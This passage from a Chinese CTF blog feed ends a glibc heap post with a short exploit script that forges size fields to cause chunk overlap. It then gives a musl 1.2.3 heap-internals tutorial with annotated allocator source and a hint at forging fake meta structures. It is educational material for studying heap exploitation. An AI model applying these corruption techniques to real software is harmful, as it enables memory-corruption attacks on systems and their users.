src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112243424.png" alt="image-20230411224341375"></a></p><p>如果我们此时释放0x1ad4140这个chunk  其prev_size也就是0x120 索引到的就是smallbin 就会和其合并 从而中间的两个chunk的指针就会保留下来 如果我们再次申请 就会成功chunk overlap</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">bigchunk()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112246077.png" title="image-20230411224610044" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304112246077.png" alt="image-20230411224610044"></a></p><p>完整:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(<span class="number">0x18</span>)  <span class="comment">#0 - 10</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">bigchunk()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#13   0xa0</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#14   0xe0</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">bigchunk()</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">bigchunk()</span><br></pre></td></tr></table></figure><p>ps: 大部分利用到这样攻击手法的 都没有堆溢出或者是UAF 所以上述的一些操作只是我为了方便演示 受限于情况需要另说 比如覆盖size域就可以通过off by null</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>musl</title>
      <link href="/2023/04/01/musl/"/>
      <url>/2023/04/01/musl/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>musl是一个轻量型的c标准库 与以往我们一直接触的glibc相比 其只需要一个libc.so文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011129370.png" title="image-20230401112932267" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011129370.png" alt="image-20230401112932267"></a></p><p>并且其源代码远远小于glibc 在近几年的ctf比赛中 偶尔会出现基于musl的堆题 musl的堆题和glibc的堆题可谓是牛马不相干 所以本文将详细介绍</p><p>所采取的libc.so版本为1.2.3 </p><p>1.1.x与1.2.x版本有比较大的改动 需要注意一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011131978.png" title="image-20230401113119956" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011131978.png" alt="image-20230401113119956"></a></p><h1 id="调试环境安装"><a href="#调试环境安装" class="headerlink" title="调试环境安装"></a>调试环境安装</h1><p>pwndbg就不需要我说明了 但是由于musl和glibc的结构体索引不同 所以常规的heap和bin指令并不能使用</p><p><strong>xf1les</strong>师傅有编写一款gdb插件 可以供我们调试musl堆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git</span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>musl源码可以在下面的地址查找下载 并且通过以下指令编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://musl.libc.org/releases/</span><br><span class="line">sudo dpkg -i musl_1.2.2-1_amd64.deb</span><br></pre></td></tr></table></figure><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>在musl中 有三级结构来管理堆  从小到大为 chunk group meta</p><p>先来看chunk的构成</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011228034.png" title="image-20230401122858010" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011228034.png" alt="image-20230401122858010"></a></p><p>就用这三个chunk来说明吧  第一个chunk和后面两个chunk都不一样 其首地址存放了一个堆地址 这是因为其上面是group结构 所以和后面的chunk不同</p><p>接着蓝框部分就是idx 而红框部分则是offset 这里可以看出UNIT实际上是0x10</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着是group结构 同一类大小的chunk都会被分配到同一个group中</p><p>并且group实际上就是这些chunk内存的总和</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011254201.png" title="image-20230401125443175" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011254201.png" alt="image-20230401125443175"></a></p><p>例如下面这两个chunk group头就是0xc20和0xc28这0x10大小  红框部分存放的是meta的地址 蓝框部分则是active_idx</p><p>表示当前group能存放多少chunk  例如此时是0xe 那么就相当于[0,e]也就是0xf个</p><p>接着来看一下meta结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011310559.png" title="image-20230401131058527" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011310559.png" alt="image-20230401131058527"></a></p><p>prev和next是双向链表指针 这里只有这一个meta 就指向其自身</p><p>mem则是存放该mata管理的group地址</p><p>avail_mask需要转化成二进制形式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32764 = 110010011101100100</span><br></pre></td></tr></table></figure><p>0表示不可分配 1表示可分配 顺序是从右往左</p><p>freed_mask同样需要转化为二进制形式 并且顺序同上 这里为0也就说明group中没有chunk被释放</p><p>last_idx表示最多可用的堆块数量 由于是[0,last_idx]所以这里还要加上1 实际上是15</p><p>free_able 代表当前meta是否可以被回收 1为可 0为不可</p><p>sizeclass则是表示由什么级别的group来管理这些chunk 你可以把其理解为原本glibc中不同size的链表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1表示这个meta里的group 是新mmap出来的,长度为多少</p><p>maplen &#x3D;0 表示group 不是新mmap 出来的在size_classes里</p><p>也有一个专门管理各个meta的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area的地址计算方式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meta_area_addr = meta &amp; ( -4096 )</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011324781.png" title="image-20230401132407751" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011324781.png" alt="image-20230401132407751"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011324621.png" title="image-20230401132444594" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011324621.png" alt="image-20230401132444594"></a></p><p>check是一串随机生成的数字 用来防止伪造</p><p>next是下一个meta_arena的地址 没有则为0</p><p>nslots为槽的数量</p><p>最后来看一个综合的大结构体 __malloc_context</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011327006.png" title="image-20230401132709960" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304011327006.png" alt="image-20230401132709960"></a></p><p>接下来的malloc和free源码分析我也是照着看雪的一篇文章学习的 讲的已经很详细了 文章链接贴在这里 我也会复制粘贴进来 方便我自己到时复现</p><p><a href="https://bbs.kanxue.com/thread-269533-1.html">https://bbs.kanxue.com/thread-269533-1.html</a></p><p>malloc</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 最大申请空间限制</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">    <span class="type">uint32_t</span> mask, first;</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> ctr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;<span class="comment">// size &gt;= 阈值 会直接通过mmap 申请空间</span></span><br><span class="line">        <span class="type">size_t</span> needed = n + IB + UNIT; <span class="comment">//UNIT 0x10 IB 4 定义在meta.h 里 这里UNIT + IB 是一个基本头的大小</span></span><br><span class="line">        <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//新mmap group 空间</span></span><br><span class="line">        <span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        wrlock();</span><br><span class="line">        step_seq();</span><br><span class="line">        g = alloc_meta();</span><br><span class="line">        <span class="keyword">if</span> (!g) &#123; <span class="comment">// 如果申请meta 失败 会把刚刚mmap 出来的group 回收</span></span><br><span class="line">            unlock();</span><br><span class="line">            munmap(p, needed);<span class="comment">// 回收group</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        g-&gt;mem = p;<span class="comment">// mem = group 地址</span></span><br><span class="line">        g-&gt;mem-&gt;meta = g; <span class="comment">//group 头部 指向meta (g 为 meta)</span></span><br><span class="line">        g-&gt;last_idx = <span class="number">0</span>;<span class="comment">//mmap的group last_idx默认值=0</span></span><br><span class="line">        g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">        g-&gt;sizeclass = <span class="number">63</span>; <span class="comment">// mmap 的申请的 sizeclass 都为63</span></span><br><span class="line">        g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">        g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">        ctx.mmap_counter++;<span class="comment">// mmap 内存记载数量++</span></span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则直接根据传入size，转换成size_classes的对应大小的 下标，</span></span><br><span class="line">    sc = size_to_class(n);</span><br><span class="line"> </span><br><span class="line">    rdlock();</span><br><span class="line">    g = ctx.active[sc]; <span class="comment">// 从现有的active中取出对应sc 的 meta ,不同sc 对应不同的meta</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果从ctx.active 中没找到对应的meta 会执行下面的if分支</span></span><br><span class="line"><span class="comment">    这里!g&lt;=&gt; g==0 ,说明ctx.active[sc] 没有对应的meta</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">        <span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];<span class="comment">// 如果在 ctx.active 没找到 就使用更大size group 的meta</span></span><br><span class="line">        <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">        <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">        <span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">            &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">            usage += <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">            sc |= <span class="number">1</span>;</span><br><span class="line">        g = ctx.active[sc];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        first = mask&amp;-mask;</span><br><span class="line">        <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">            g-&gt;avail_mask = mask-first;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        idx = a_ctz_32(first);</span><br><span class="line">        <span class="keyword">goto</span> success;</span><br><span class="line">    &#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果当前group 不满足就会来到这里:</span></span><br><span class="line"><span class="comment">      alloc_slot 从group 中取出对应大小chunk 的idx</span></span><br><span class="line"><span class="comment">      这里先从对应sc 的ctx.active[sc] 中找对应的meta的group 有无空闲chunk可以使用</span></span><br><span class="line"><span class="comment">        再从队列中其他meta的group 中找</span></span><br><span class="line"><span class="comment">      如果队列中其他meta的group 有可利用的chunk,就使用</span></span><br><span class="line"><span class="comment">      如果没有就重新分配一个新的group</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g = ctx.active[sc];<span class="comment">// 取出 sc 对应active meta</span></span><br><span class="line"> </span><br><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 从对应meta 中的group 取出 第idx号chunk  n = size</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk分配的主要逻辑是下面这个for循环</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>; <span class="comment">//先检查g所指meta是否存在，若存在mask = g-&gt;avail_mask</span></span><br><span class="line">    first = mask&amp;-mask;                     <span class="comment">//这里只有mask=0时，first才会为0</span></span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;                        <span class="comment">//mask为0，first=0，无可用空闲chunk，跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)<span class="comment">//如果是排它锁, 那么下面保证成功</span></span><br><span class="line">        g-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask) <span class="comment">//成功找到并设置avail_mask之后,continue 后设置idx，然后跳出</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">    upgradelock();</span><br><span class="line"> </span><br><span class="line">    idx = alloc_slot(sc, n);</span><br></pre></td></tr></table></figure><p>跟进一下索引idx的alloc_slot函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;    <span class="comment">// 尝试从限制active 中找到合适可用的</span></span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 如果没找到 重新创造一个meta，然后重新分配一个size大小对应sc的group，给这个新分配的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g); <span class="comment">//把新meta 加入队列</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进一下try_avail函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="type">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask)<span class="comment">//mask = m-&gt;avail_mask (!mask) 表示没有可用的chunk了</span></span><br><span class="line">    &#123;                                        </span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) <span class="comment">// if (!m-&gt;freed_mask) &lt;=&gt; 没有已经释放的chunk</span></span><br><span class="line">        &#123;                                </span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:既没有可用的chunk，也没有被释放还未回收的chunk，即chunk都被使用，且都没被释放</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            dequeue(pm, m); <span class="comment">// freed_mask==avail_mask=0, group 空间已满 让对应的meta 出队</span></span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        这里else表示的是:无可用空闲chunk，但是有已经释放的chunk</span></span><br><span class="line"><span class="comment">        !!! free释放的chunk 不能马上被复用的 !!!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       进入这个分支的条件:没有可用的chunk，有被释放还未回收的chunk。</span></span><br><span class="line"><span class="comment">       有点好奇这里，如果达成这个条件，然后利用指针互写，修改m-&gt;next 伪造的meta，是不是就可以制造fake meta 入队的假象</span></span><br><span class="line"><span class="comment">       若meta链表中没有，一般meta 的next和prev 都是指向自己</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// 如果这个meta 的group 只含有一个chunk ，且被释放就跳过，</span></span><br><span class="line">        <span class="comment">// 或者 这个meta 的group 根本不能被释放 如mmap 的 group last_idx = 0 freeable=1</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable)</span><br><span class="line">        &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m)</span><br><span class="line">            &#123; <span class="comment">// 如果这个meta 后还有meta 就切换到 下一个meta</span></span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) <span class="comment">// 页对齐</span></span><br><span class="line">                &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mask = activate_group(m);<span class="comment">// 这里是给 m的 avail_mask 打上标记</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        decay_bounces(m-&gt; sizeclass);</span><br><span class="line">    &#125;</span><br><span class="line">    first = mask&amp;-mask; <span class="comment">// 若 mask%2==0 则first =结果是能整除这个偶数的最大的2的幂 若 mask%2==1 则first永远为1</span></span><br><span class="line">    m-&gt;avail_mask = mask-first;</span><br><span class="line">    <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述源码可以总结为下列流程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、判断是否超过size 阈值</span><br><span class="line"></span><br><span class="line">先检查 申请的chunk的 needed size 是否超过最大申请限制</span><br><span class="line">检查申请的needed 是否超过需要mmap 的分配的阈值 超过就用mmap 分配一个group 来给chunk使用</span><br><span class="line">若是mmap 则设置各种标记</span><br><span class="line">二、分配chunk</span><br><span class="line"></span><br><span class="line">若申请的chunk 没超过阈值 就从active 队列找管理对应size大小的meta</span><br><span class="line">关于找对应size的meta 这里有两种情况:</span><br><span class="line">如果active 对应size的meta 位置上为空，没找到那么尝试先找size更大的meta</span><br><span class="line"></span><br><span class="line">如果active 